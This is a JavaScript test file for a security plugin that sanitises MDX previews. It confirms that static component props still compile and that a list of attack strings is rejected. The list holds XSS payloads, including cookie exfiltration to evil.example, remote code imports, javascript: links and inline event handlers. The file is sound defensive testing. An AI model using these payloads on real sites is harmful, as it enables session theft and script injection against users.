import assert from "node:assert/strict";
import { test } from "node:test";
import { serialize } from "next-mdx-remote/serialize";
import remarkPreviewSecurity from "../../src/lib/draft/remark-preview-security.ts";

const compile = (mdx) =>
  serialize(mdx, {
    mdxOptions: { remarkPlugins: [remarkPreviewSecurity] },
    blockJS: false,
    blockDangerousJS: true,
  });

test("static component props, Icon JSX, and comments remain usable", async () => {
  const result = await compile(`
{/* Maintainer note */}
<ParameterList parameters={[{name: "speed", description: "Playback speed"}]} />
<PremiumCard href="/docs/deadlock" icon={<Icon name="Box" />} level="advanced">Guide</PremiumCard>
<ToolHeader facts={["Free", "Windows"]} primary={{label: "Download", href: "https://example.com/tool"}} />
<img src="/wiki-images/example.webp" width={1200} height={360} alt="Example" />
<Tabs items={["First", "Second"]}><Tab value="First">Text</Tab></Tabs>
`);
  assert.match(result.compiledSource, /Playback speed/);
  assert.match(result.compiledSource, /1200/);
});

const attacks = [
  '{fetch("https://evil.example/" + document.cookie)}',
  "{document.cookie}",
  '<div title={(() => { window.location = "https://evil.example"; return "x" })()} />',
  '<div title={import("https://evil.example/code.js")} />',
  "<div {...{onClick: () => alert(1)}} />",
  '<img src="x" onError={() => alert(1)} />',
  '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />',
  '<iframe srcDoc="<script>alert(1)</script>" />',
  '<script src="https://evil.example/code.js" />',
  "<style>body { display: none }</style>",
  '<a href="javascript:alert(1)">Open</a>',
  '<a href={"javascript:alert(1)"}>Open</a>',
  '<ToolHeader primary={{label: "Open", href: "javascript:alert(1)"}} />',
  "[Open](javascript:alert%281%29)",
  "[Open][bad]\n\n[bad]: javascript:alert%281%29",
  '<div style={{["constructor"]: "x"}} />',
  '<div style={{get color() { return fetch("https://evil.example") }}} />',
  'export const data = fetch("https://evil.example")',
];

for (const attack of attacks) {
  test(`preview rejects ${attack.slice(0, 70)}`, async () => {
    await assert.rejects(compile(attack));
  });
}
